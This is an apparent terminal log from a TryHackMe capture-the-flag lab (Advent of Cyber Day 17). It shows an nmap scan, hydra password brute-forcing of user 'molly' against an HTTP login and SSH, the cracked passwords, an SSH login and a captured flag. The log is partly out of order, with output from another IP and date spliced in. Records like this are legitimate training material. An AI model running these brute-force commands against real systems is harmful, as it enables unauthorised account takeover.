@@ -1,0 +1,207 @@
+nmap -sV -sS -Pn -A -vv 10.10.130.208
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 16:17 IST
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 16:17
+Completed NSE at 16:17, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 16:17
+Completed NSE at 16:17, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 16:17
+Completed NSE at 16:17, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 16:17
+Completed Parallel DNS resolution of 1 host. at 16:17, 0.37s elapsed
+Initiating SYN Stealth Scan at 16:17
+Scanning 10.10.130.208 [1000 ports]
+Discovered open port 80/tcp on 10.10.130.208
+Discovered open port 22/tcp on 10.10.130.208
+Increasing send delay for 10.10.130.208 from 0 to 5 due to 255 out of 848 dropped probes since last increase.
+Completed SYN Stealth Scan at 16:18, 24.64s elapsed (1000 total ports)
+Initiating Service scan at 16:18
+Scanning 2 services on 10.10.130.208
+Completed Service scan at 16:18, 6.80s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 10.10.130.208
+Retrying OS detection (try #2) against 10.10.130.208
+Retrying OS detection (try #3) against 10.10.130.208
+Retrying OS detection (try #4) against 10.10.130.208
+Retrying OS detection (try #5) against 10.10.130.208
+Initiating Traceroute at 16:18
+Completed Traceroute at 16:18, 0.37s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 16:18
+Completed Parallel DNS resolution of 2 hosts. at 16:18, 0.26s elapsed
+NSE: Script scanning 10.10.130.208.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 16:18
+Completed NSE at 16:18, 11.39s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 16:18
+Completed NSE at 16:18, 1.60s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 16:18
+Completed NSE at 16:18, 0.00s elapsed
+Nmap scan report for 10.10.130.208
+Host is up, received user-set (0.24s latency).
+Scanned at 2020-08-09 16:17:52 IST for 63s
+Not shown: 998 closed ports
+Reason: 998 resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 3f:03:f0:47:b5:49:75:e1:fd:83:39:76:f6:56:04:e9 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVEN9XGgriFL/g7TipE0rk2LF2ecOjrZTnSUjy5fWs4l9JT1BlNHZ52N+kqPKUsUozc7C49Gv/OrPAfmY6MtSjyWhLENYjUoNukQxD3RM46Z3s7kblaGiCEQLDrtm+OKejzWbTScAC6bBLxQQNEa7QrcTeYwgpQn4uWzcCLSpAPA+KJN/tvtN6QWu1qGP732n7Ps6Gk7wbXNL4Z4iD1JL8dYZespLYAcXmlGxTOIPwMYEbXaJnJ8cRK0N51WkER4StnqH9+2PO7XD0IPxQ+wVsb57HFLMC16CVQ+C6EknXAuNPde+JCemcYxO7e04V1dYOonSgyNaJF72QlD4JT21F
+|   256 49:0d:36:70:12:c0:91:7b:56:09:bc:61:ae:23:55:d6 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMbLudtf1xDtPzOasv2HOsp5fSF7j+L+D9Oo1sDMbquqqs2wWk1D7Gl8Lk6Wyuf8ZqfFBF/rxk08SxzWsZwkL/Y=
+|   256 b5:d8:a9:41:b1:4d:3e:02:2d:42:ed:ab:f9:75:2e:ab (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPFadC/Z02pzzDzrR3bkCymdsXAqrAPNyfrzlpWikb6H
+80/tcp open  http    syn-ack ttl 63 Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-title: Christmas Challenge
+|_Requested resource was /login
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=8/9%OT=22%CT=1%CU=36431%PV=Y%DS=2%DC=T%G=Y%TM=5F2FD497
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ(
+OS:SP=106%GCD=1%ISR=108%TI=Z%CI=I%TS=8)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
+OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=6
+OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW
+OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 200.444 days (since Wed Jan 22 05:39:37 2020)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+─[kevin@parrot]─[~/Documents]
+└──╼ $hydra -l molly -P rockyou.txt 10.10.130.208 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
+
+TTEMPT] target 10.10.112.172 - login "molly" - pass "12345678" - 9 of 14344398 [child 8] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "abc123" - 10 of 14344398 [child 9] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "nicole" - 11 of 14344398 [child 10] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "daniel" - 12 of 14344398 [child 11] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "babygirl" - 13 of 14344398 [child 12] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "monkey" - 14 of 14344398 [child 13] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "lovely" - 15 of 14344398 [child 14] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "jessica" - 16 of 14344398 [child 15] (0/0)
+[ATTEMPT] target 10.10.112.172 - login "molly" - pass "654321" - 17 of 14344398 [child 0] (0/0)
+...
+[SNIP]
+...
+[80][http-post-form] host: 10.10.112.172   login: molly   password: joyness1994
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 19:06:06
+
+
+
+─[root@parrot]─[/home/kevin/THM/ADV of cyber/DAY17]
+└──╼ #hydra -l molly -P '/home/kevin/Documents/rockyou.txt' 10.10.130.208 -t 4 ssh -V
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-09 16:42:53
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.130.208:22/
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "iloveyou" - 5 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "princess" - 6 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "1234567" - 7 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "rockyou" - 8 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "12345678" - 9 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "abc123" - 10 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "nicole" - 11 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "daniel" - 12 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "babygirl" - 13 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "monkey" - 14 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "lovely" - 15 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "jessica" - 16 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "654321" - 17 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "michael" - 18 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "ashley" - 19 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "qwerty" - 20 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "111111" - 21 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "iloveu" - 22 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "000000" - 23 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "michelle" - 24 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "tigger" - 25 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "sunshine" - 26 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "chocolate" - 27 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "password1" - 28 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "soccer" - 29 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "anthony" - 30 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "friends" - 31 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.130.208 - login "molly" - pass "butterfly" - 32 of 14344399 [child 2] (0/0)
+[22][ssh] host: 10.10.130.208   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-09 16:43:56
+┌─[root@par
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT       ADDRESS
+1   359.35 ms 10.8.0.1
+2   359.39 ms 10.10.130.208
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 16:18
+Completed NSE at 16:18, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 16:18
+Completed NSE at 16:18, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 16:18
+Completed NSE at 16:18, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.52 seconds
+           Raw packets sent: 1600 (74.928KB) | Rcvd: 1498 (130.425KB)
+┌─[root@parrot]─[/home/kevin/THM/ADV of cyber/DAY17]
+└──╼ #
+┌─[✗]─[kevin@parrot]─[~/Documents]
+└──╼ $ssh molly@10.10.130.208
+molly@10.10.130.208's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+32 updates are security updates.
+
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+molly@ip-10-10-130-208:~$ ls
+flag2.txt
+molly@ip-10-10-130-208:~$ cat flag2.txt
+THM{c8eeb0468febbadea859baeb33b2541b}
+molly@ip-10-10-130-208:~$ 
+
+
